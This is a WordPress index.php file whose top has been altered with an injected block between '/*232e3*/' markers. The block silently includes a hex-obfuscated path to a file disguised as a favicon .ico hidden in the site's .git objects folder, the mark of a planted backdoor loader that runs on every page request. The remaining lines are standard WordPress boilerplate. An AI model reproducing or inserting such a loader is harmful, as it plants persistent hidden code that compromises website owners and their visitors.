<?php
/*232e3*/

@include "\x2fho\x6de/\x75bu\x6etu\x2fpu\x62li\x63_h\x74ml\x2fta\x68it\x69/.\x67it\x2fob\x6aec\x74s/\x34d/\x66av\x69co\x6e_1\x66ed\x37a.\x69co";

/*232e3*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
